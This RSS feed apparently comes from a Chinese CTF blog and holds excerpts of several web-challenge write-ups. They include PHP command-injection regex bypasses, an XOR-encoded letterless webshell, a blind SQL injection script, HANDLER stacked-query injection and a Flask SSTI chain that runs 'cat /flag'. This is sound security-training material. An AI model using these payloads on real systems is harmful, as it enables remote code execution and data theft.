<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>RCE bypass on wh1sper</title>
    <link>https://anthem-whisper.github.io/tags/rce-bypass/</link>
    <description>Recent content in RCE bypass on wh1sper</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Wed, 23 Sep 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/tags/rce-bypass/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>BUUOJ刷题记录(3)</title>
      <link>https://anthem-whisper.github.io/p/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/</link>
      <pubDate>Wed, 23 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/</guid>
      <description>[FBCTF2019]RCEService 考点：%0a绕过正则匹配，绝对路径调用系统命令
要求用json传入cmd参数RCE，但是只给了ls命令其他的都不给
比赛的时候应该是给了源码：
&amp;lt;?phpputenv(&#39;PATH=/home/rceservice/jail&#39;);if (isset($_REQUEST[&#39;cmd&#39;])) {$json = $_REQUEST[&#39;cmd&#39;];if (!is_string($json)) {echo &#39;Hacking attempt detected&amp;amp;lt;br/&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;&#39;;} elseif (preg_match(&#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#39;, $json)) {echo &#39;Hacking attempt detected&amp;amp;lt;br/&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;&#39;;} else {echo &#39;Attempting to run command:&amp;amp;lt;br/&amp;amp;gt;&#39;;$cmd = json_decode($json, true)[&#39;cmd&#39;];if ($cmd !== NULL) {system($cmd);} else {echo &#39;Invalid input&#39;;}echo &#39;&amp;amp;lt;br/&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;&#39;;}}?&amp;gt;正则匹配的时候没有用m修饰符(换行匹配)，所以我们可以用%0a来绕过
然后他设置了PATH=/home/rceservice/jail，这个目录下只有ls一个命令，想要调用其他系统命令我们还要传入绝对路径，比如/bin/cat。
flag在PATH的上级目录。
?cmd={%0A&amp;quot;cmd&amp;quot;:&amp;quot;/bin/cat /home/rceservice/flag&amp;quot;%0A}[GYCTF2020]FlaskApp 考点：flaskSSTI、pin码
referer：https://blog.csdn.net/Alexhcf/article/details/108400293
从base64解码发现SSTI 题目最开始给了两个页面，一个是base64加密、一个是base64解密
在base64解密的页面如果解密出现错误的话，会开启debug
而且在base64解密的页面发现了模板注入，传入{{config}}的base64编码会看到以下界面：</description>
    </item>
    
    <item>
      <title>“第五空间”智能安全大赛</title>
      <link>https://anthem-whisper.github.io/p/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</link>
      <pubDate>Fri, 26 Jun 2020 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</guid>
      <description>hate-php 考点：异或取反构造无字母数字webshell
开题送码：
&amp;lt;?phperror_reporting(0);if(!isset($_GET[&#39;code&#39;])){highlight_file(__FILE__);}else{$code = $_GET[&#39;code&#39;];if (preg_match(&#39;/(f|l|a|g|\.|p|h|\/|;|\&amp;quot;|\&#39;|\`|\||\[|\]|\_|=)/i&#39;,$code)) { die(&#39;You are too good for me&#39;); }$blacklist = get_defined_functions()[&#39;internal&#39;];foreach ($blacklist as $blackitem) { if (preg_match (&#39;/&#39; . $blackitem . &#39;/im&#39;, $code)) { die(&#39;You deserve better&#39;); } }assert($code);}preg_match ban掉了下划线等字符，然后 get_defined_functions()[&#39;internal&#39;] 禁用了内置函数
但是没有过滤取反~和异或^，
PHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过 (&#39;phpinfo&#39;)(); 来执行函数，第一个括号中可以是任意PHP表达式。
不但如此，这个payload还支持接受参数，比如 (&#39;phpinfo&#39;)(1) ，这道题过滤了分号，但是这道题不需要分号也可以执行
那么我们自然可以用这个来执行一些代码；
?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;amp;%ff=phpinfo成功返回了 phpinfo ，我们继续构造一个shell：
?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ee}(${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff})&amp;amp;%ee=system&amp;amp;%ff=ls可以看到ls的结果，不过cat好像又被宰掉了，用 tac fl* 来获取flag
do you know 预期：gopher协议SSRF打XXE，URL编码显示空字符，pop链</description>
    </item>
    
    <item>
      <title>绕过4-5个字符限制getshell</title>
      <link>https://anthem-whisper.github.io/p/%E7%BB%95%E8%BF%874-5%E4%B8%AA%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6getshell/</link>
      <pubDate>Tue, 02 Jun 2020 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/%E7%BB%95%E8%BF%874-5%E4%B8%AA%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6getshell/</guid>
      <description>这个东西起源于HITCON CTF 2017的一道题，高校战疫Hack Me也曾经出现过，最近突然做到了来说一下
参考：https://www.anquanke.com/post/id/87203
 源码 五字版本
&amp;lt;?php$sandbox = &#39;/www/sandbox/&#39; . md5(&amp;quot;orange&amp;quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);@mkdir($sandbox);@chdir($sandbox);if (isset($_GET[&#39;cmd&#39;]) &amp;amp;&amp;amp; strlen($_GET[&#39;cmd&#39;]) &amp;lt;= 5) {@exec($_GET[&#39;cmd&#39;]);} else if (isset($_GET[&#39;reset&#39;])) {@exec(&#39;/bin/rm -rf &#39; . $sandbox);}highlight_file(__FILE__);四字版本：
&amp;lt;?php$sandbox = &#39;/www/sandbox/&#39; . md5(&amp;quot;orange&amp;quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);@mkdir($sandbox);@chdir($sandbox);if (isset($_GET[&#39;cmd&#39;]) &amp;amp;&amp;amp; strlen($_GET[&#39;cmd&#39;]) &amp;lt;= 4) {@exec($_GET[&#39;cmd&#39;]);} else if (isset($_GET[&#39;reset&#39;])) {@exec(&#39;/bin/rm -rf &#39; . $sandbox);}highlight_file(__FILE__);预备知识 在cmd长度小于5（4）个字符的时候用 exec 函数执行系统命令，不过 exec 函数是默认没有回显的，这里我们就只能盲打。</description>
    </item>
    
    <item>
      <title>WHUCTF2020</title>
      <link>https://anthem-whisper.github.io/p/whuctf2020/</link>
      <pubDate>Sun, 24 May 2020 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/whuctf2020/</guid>
      <description>武汉大学的CTF，难的简单的都有，最近比赛是真滴多，打完金盆洗手了
 Easy_sqli 考点：bool盲注，双写绕过
简单，没啥好讲的
#wh1sperimport requestshost = &#39;http://218.197.154.9:10011/login.php#&#39;def mid(bot, top):return (int)(0.5 * (top + bot))def sqli():name = &#39;&#39;for j in range(1, 250):top = 126bot = 32while 1:babyselect = &#39;(seselectlect f111114g frfromom f1ag_y0u_wi1l_n3ver_kn0w)&#39;#select = &amp;quot;1&#39; oorr ascii(substr(&amp;quot;+babyselect+&amp;quot;,{},1))&amp;gt;{} #&amp;quot;.format(j, mid(bot, top))data = {&amp;quot;user&amp;quot;: select, &amp;quot;pass&amp;quot;: &amp;quot;a&amp;quot;}r = requests.post(url=host, data=data)#print(data)if &#39;Login success!&#39; in r.text: # 成功if top - 1 == bot: # top和bot相邻，说明name是topname += chr(top)print(name)breakbot = mid(bot, top) # 成功就上移botelse: # 失败if top - 1 == bot: # top和bot相邻，加上失败，说明name是botname += chr(bot)print(name)breaktop = mid(bot, top) # 失败就下移topif __name__ == &#39;__main__&#39;:sqli()WHUCTF{r3lly_re11y_n0t_d1ffIcult_yet?</description>
    </item>
    
    <item>
      <title>MiniL2020_web_wp</title>
      <link>https://anthem-whisper.github.io/p/minil2020_web_wp/</link>
      <pubDate>Sun, 10 May 2020 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/minil2020_web_wp/</guid>
      <description>西电校赛，难度适中，本人内鬼选手，看了下题。
 id_wife 考点：堆叠注入
不是很难，最开始没想到堆叠，跑去盲注，差点怀疑人生
测出来堆叠之后就简单了，其他过滤什么我不知道，直接参考新春战疫的一道sqli，Handler一把梭
frank&#39;);handler `1145141919810` open;handler `1145141919810` read first;handler `1145141919810` read next;#minil{4cc5cda6-30c6-48ff-ab4e-9c2830005191}
Personal_IP_Query 考察：flaskSSTI，绕过下划线、单双引号。
学习链接
&amp;gt;&amp;gt;flag0师傅
&amp;gt;&amp;gt;byc_404师傅
打开题目，显示Your Ip IS……马上想到XFF头，伪造之后发现输入的XFF头显示出来了，然后踌躇了一阵子，回头看响应包，响应头里面有一个SERVER提示这个是python的后端，那么就尝试SSTI
输入 {{2+2}} 之后回显的 4 实锤。
Fuzz，过滤了下划线、单双引号、没有过滤中括号
最开始我用的是[request.value.class]那个，后来试了半天不能绕过中括号里还有引号的，后来队友改用attr(request.args.class)秒出
在class中寻找模块exp：
#python 3import restr = &#39;&#39;&#39;（回显信息）&#39;&#39;&#39;list = re.split(&#39;,&#39;, str)for i in range(0, len(list)):if &#39;catch_warnings&#39; in list[i]:print(i)breakplayload：
?x1=__class__&amp;amp;x2=__base__&amp;amp;x3=__subclasses__&amp;amp;x4=__getitem__&amp;amp;x5=__init__&amp;amp;x6=__globals__&amp;amp;x7=__builtins__&amp;amp;x8=eval&amp;amp;x9=__import__(&amp;quot;os&amp;quot;).popen(&#39;cat+/flag&#39;).read()X-Forwarded-For:{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(174)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)}}复现时补充：
我的原来那个中括号的做法时走得通的，然后os模块也可以的，只是当时可能由于某些玄学原因没成功，这里补上：
XFF：{{ [][request.args.class][request.args.mro][1][request.args.subclasses]()[127] }}//回显：Your IP: &amp;lt;class &#39;os.</description>
    </item>
    
  </channel>
</rss>
